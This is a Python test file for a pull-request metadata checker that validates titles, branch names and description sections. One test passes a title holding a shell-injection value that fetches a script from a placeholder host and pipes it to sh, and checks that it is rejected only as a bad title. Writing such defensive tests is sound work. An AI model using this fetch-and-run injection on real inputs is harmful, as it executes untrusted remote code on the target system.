import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tools"))

import pr_meta  # noqa: E402

BODY = """## Purpose
Record how long each visit took.

## Ticket
VIS-12

## How it was tested
New TransactionCase test, run locally.

## Tool used
GitHub Copilot

## Rollback plan
Revert the pull request.
"""


def codes(title="feat(visit_log): record visit duration", ref="feature/visit-duration", body=BODY):
    return [code for code, _ in pr_meta.check(title, ref, body)]


def test_compliant_pull_request_passes():
    assert codes() == []


def test_free_text_title_is_rejected():
    assert codes(title="updated the readme") == ["GIT-04"]


def test_title_with_shell_characters_is_only_a_bad_title():
    assert codes(title='"; curl example.invalid | sh #') == ["GIT-04"]


def test_branch_outside_the_naming_scheme_is_rejected():
    assert codes(ref="ahmed-test") == ["GIT-03"]


def test_tool_branches_are_allowed():
    assert codes(ref="copilot/fix-visit-total") == []
    assert codes(title="build(deps): bump lxml", ref="dependabot/pip/lxml-5.3.0", body="") == []


def test_untouched_template_is_rejected():
    template = (Path(__file__).resolve().parents[1] / ".github" / "pull_request_template.md").read_text()
    assert set(codes(body=template)) == {"GIT-05"}


def test_missing_section_is_rejected():
    assert codes(body=BODY.replace("VIS-12", "")) == ["GIT-05"]
